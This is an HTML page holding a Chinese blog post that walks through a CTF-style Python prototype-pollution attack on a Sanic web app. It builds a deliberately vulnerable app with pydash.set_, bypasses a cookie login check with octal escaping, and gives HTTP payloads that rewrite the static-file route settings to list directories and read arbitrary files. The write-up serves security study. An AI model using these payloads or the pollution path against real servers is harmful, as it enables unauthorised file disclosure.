@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>Python原型链污染 - Twings</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期五, 八月 16日 2024, 10:46 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    1.6k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      7 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>无。</p>
+<a id="more"></a>
+<hr>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>新建一个Python项目，先添加依赖：</p>
+<pre><code class="shell">pip install sanic
+pip install sanic_session
+pip install pydash==5.1.2
+</code></pre>
+<p>限定了pydash版本，估计原型链污染就发生在这个版本的pydash里面了。</p>
+<p>然后新建一个static目录，里面随便写个index.html，然后新建一个index.py把主代码贴进去就行：</p>
+<pre><code class="python"># -*- coding:utf8 -*-
+from sanic import Sanic
+from sanic.response import text, html
+from sanic_session import Session
+import pydash
+
+
+class Pollute:
+    def __init__(self):
+        pass
+
+
+app = Sanic(__name__)
+app.static(&quot;/static/&quot;, &quot;./static/&quot;)
+Session(app)
+
+
+@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+async def index(request):
+    return html(open(&#39;static/index.html&#39;).read())
+
+
+@app.route(&quot;/login&quot;)
+async def login(request):
+    user = request.cookies.get(&quot;user&quot;)
+    if user.lower() == &#39;adm;n&#39;:
+        request.ctx.session[&#39;admin&#39;] = True
+        return text(&quot;login success&quot;)
+
+    return text(&quot;login fail&quot;)
+
+
+@app.route(&quot;/src&quot;)
+async def src(request):
+    return text(open(__file__).read())
+
+
+@app.route(&quot;/admin&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+async def admin(request):
+    if request.ctx.session.get(&#39;admin&#39;):
+        key = request.json[&#39;key&#39;]
+        value = request.json[&#39;value&#39;]
+        if key and value and type(key) is str and &#39;_.&#39; not in key:
+            pollute = Pollute()
+            pydash.set_(pollute, key, value)
+            return text(&quot;success&quot;)
+        else:
+            return text(&quot;forbidden&quot;)
+
+    return text(&quot;forbidden&quot;)
+
+
+if __name__ == &#39;__main__&#39;:
+    app.run(host=&#39;0.0.0.0&#39;)
+
+</code></pre>
+<h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><p>原型链污染发生地点为pydash.set_函数调用，前提条件为登录admin用户，admin用户登录条件为登录用户名满足字符串adm;n：</p>
+<pre><code class="python">user = request.cookies.get(&quot;user&quot;)
+if user.lower() == &#39;adm;n&#39;:
+    request.ctx.session[&#39;admin&#39;] = True
+    return text(&quot;login success&quot;)
+</code></pre>
+<p>尝试直接提交字符串，发现分号;会截断cookie，而且sanic貌似不会主动进行URL解码，所以需要寻找另一种编码方式进行绕过。</p>
+<p>找到sanic框架下的cookie处理代码，该代码位于request.py文件中，首先根据分号;切割cookie键值对：</p>
+<pre><code class="python">for token in raw.split(&quot;;&quot;):
+</code></pre>
+<p>接下来做完cookie名合法性验证后，会对双引号”包裹的cookie值有一个特殊处理：</p>
+<pre><code class="python">if len(value) &gt; 2 and value[0] == &#39;&quot;&#39; and value[-1] == &#39;&quot;&#39;:  # no cov
+    value = _unquote(value)
+</code></pre>
+<p>其中存在一个特殊的正则匹配：</p>
+<pre><code class="python">o_match = OCTAL_PATTERN.search(str, i)
+</code></pre>
+<p>该正则匹配的是八进制数据：</p>
+<pre><code class="python">OCTAL_PATTERN = re.compile(r&quot;\\[0-3][0-7][0-7]&quot;)
+</code></pre>
+<p>后续会对匹配到的字符串进行进制转换：</p>
+<pre><code class="python">res.append(str[i:j])
+res.append(chr(int(str[j + 1 : j + 4], 8)))  # noqa: E203
+i = j + 4
+</code></pre>
+<p>因此可以通过双引号”和八进制编码完成登录：</p>
+<pre><code class="http">GET /login HTTP/1.0
+Host: localhost:8000
+Cookie: user=&quot;adm\073n&quot;
+</code></pre>
+<h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>观察到Pollute类下存在一个<strong>init</strong>构造函数，根据参考文章，可以通过访问其属性获得当前的类和方法：</p>
+<pre><code class="python">pollute.__init__.__globals__
+</code></pre>
+<p>结果：</p>
+<p><img src="/css/images/sanic/01.png" srcset="/img/loading.gif" alt=""></p>
+<p>观察代码，可以看到app通过static函数设置了静态文件目录，而静态目录下的文件可以被浏览器访问，因此考虑通过污染static配置的方式，将static目录修改为根目录等方式实现任意文件读取。</p>
+<p>观察static的可选参数，可以看到存在几个有用的参数：</p>
+<pre><code>file_or_directory (Union[PathLike, str]): Path to the static file
+    or directory with static files.
+directory_view (bool, optional): Whether to fallback to showing
+    the directory viewer when exposing a directory. Defaults
+    to `False`.
+</code></pre><p>代表了静态文件目录和列目录开关，修改后看起来可以实现列根目录和任意文件读取。</p>
+<p>接下来就要尝试对这些参数进行污染，尝试访问static路径如<a href="http://localhost:8000/static/，得到报错：" target="_blank" rel="noopener">http://localhost:8000/static/，得到报错：</a></p>
+<pre><code>Traceback (most recent call last):
+  File &quot;handle_request&quot;, line 102, in handle_request
+    if TYPE_CHECKING:
+  File &quot;D:\Python2.7\sanic\venv\lib\site-packages\sanic\mixins\static.py&quot;, line 332, in _static_request_handler
+    return await directory_handler.handle(request, request.path)
+  File &quot;D:\Python2.7\sanic\venv\lib\site-packages\sanic\handlers\directory.py&quot;, line 70, in handle
+    raise IsADirectoryError(f&quot;{self.directory.as_posix()} is a directory&quot;)
+IsADirectoryError: D:/Python2.7/sanic/static is a directory
+</code></pre><p>怀疑关键点可能在static.py中，给主程序中的app.static函数调用下断点，然后找到static.py文件，在StaticHandleMixin类里面找到_register_static注册函数：</p>
+<pre><code class="python">_handler = wraps(self._static_request_handler)(
+    partial(
+        self._static_request_handler,
+        file_or_directory=file_or_directory,
+        use_modified_since=static.use_modified_since,
+        use_content_range=static.use_content_range,
+        stream_large_files=static.stream_large_files,
+        content_type=static.content_type,
+        directory_handler=static.directory_handler,
+    )
+)
+
+route, _ = self.route(  # type: ignore
+    uri=uri,
+    methods=[&quot;GET&quot;, &quot;HEAD&quot;],
+    name=name,
+    host=static.host,
+    strict_slashes=static.strict_slashes,
+    static=True,
+)(_handler)
+</code></pre>
+<p>该函数会将静态目录和列目录开关等配置整合为一个handler，然后注册到route路由中去，找到route函数，此时用于注册路由的name等标识如下：</p>
+<p><img src="/css/images/sanic/02.png" srcset="/img/loading.gif" alt=""></p>
+<p>用于注册路由的name为<strong>main</strong>.static，继续往下看route函数，可以看到返回的是一个decorator函数，该嵌套函数通过nonlocal标识访问外层函route数的name等变量，再与handler统合为一个FutureRoute对象：</p>
+<pre><code class="python">route = FutureRoute(
+    handler,
+    uri,
+    None if websocket else frozenset([x.upper() for x in methods]),
+    host,
+    strict_slashes,
+    stream,
+    version,
+    name,
+    ignore_body,
+    websocket,
+    subprotocols,
+    unquote,
+    static,
+    version_prefix,
+    error_format,
+    route_context,
+)
+...
+if apply:
+    self._apply_route(route, overwrite=overwrite)
+</code></pre>
+<p>最后进入到app.py文件的_apply_route函数提交，添加到app下面的router成员中，此时的params即新构造FutureRoute对象里的name和handler等数据的集合：</p>
+<pre><code class="python">routes = self.router.add(**params)
+</code></pre>
+<p>再进入到这个add函数，会调用更上一层的add函数：</p>
+<pre><code class="python">route = super().add(**params)  # type: 
+</code></pre>
+<p>最后以name作为索引放置到name_index里：</p>
+<pre><code class="python">if name:
+    self.name_index[name] = route
+</code></pre>
+<p>综上所述，从app出发可以摸索到static相关配置，因此存在通过原型链污染修改static配置的可能性，在编辑器中调试一下试一下就能找到搜索路径：</p>
+<pre><code class="python">pollute.__init__.__globals__[&#39;app&#39;].router.name_index[&#39;__mp_main__.static&#39;].handler.keywords
+</code></pre>
+<p>结果：</p>
+<p><img src="/css/images/sanic/03.png" srcset="/img/loading.gif" alt=""></p>
+<p>污染路径已经找到了，思路也清晰了，可以开始实操原型链污染然后实现文件读取了。</p>
+<h3 id="污染"><a href="#污染" class="headerlink" title="污染"></a>污染</h3><p>先尝试修改directory_view实现列目录功能：</p>
+<pre><code class="HTTP">POST /admin HTTP/1.0
+Host: localhost:8000
+Cookie: session=8257742079694b2db0958b85ecfab79f; user=&quot;adm\073n&quot;
+content-type: application/json
+Content-Length: 32
+
+{&quot;key&quot;: &quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;, &quot;value&quot;: &quot;True&quot;}
+</code></pre>
+<p>访问<a href="http://localhost:8000/static/，这次就成功列目录了：" target="_blank" rel="noopener">http://localhost:8000/static/，这次就成功列目录了：</a></p>
+<p><img src="/css/images/sanic/04.png" srcset="/img/loading.gif" alt=""></p>
+<p>再修改file_or_directory为其他路径即可实现列目录后文件读取，注意一下类型：</p>
+<pre><code class="HTTP">POST /admin HTTP/1.0
+Host: localhost:8000
+Cookie: session=8257742079694b2db0958b85ecfab79f; user=&quot;adm\073n&quot;
+content-type: application/json
+Content-Length: 166
+
+{&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;,&quot;value&quot;: [&quot;D:/&quot;]}
+</code></pre>
+<hr>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235" target="_blank" rel="noopener">CISCN2024-WEB-Sanic gxngxngxn</a></p>
+<p><a href="https://www.cnblogs.com/gxngxngxn/p/18290489" target="_blank" rel="noopener">DASCTF 2024暑期挑战赛-WEB-Sanic’s revenge gxngxngxn</a></p>
+<p><a href="https://xz.aliyun.com/t/15143?time__1311=GqjxuQD%3D0%3DExlxGgx%2BOxm2iwG8CWUph3x#toc-4" target="_blank" rel="noopener">Sanic框架下原型链污染(以国赛sanic和dasctf-sanic题复现为例)</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/原型链污染/">原型链污染</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Python/">Python</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2024/08/13/ejs模板引擎玩法学习/">
+                        <span>ejs模板引擎玩法学习</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Python原型链污染&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
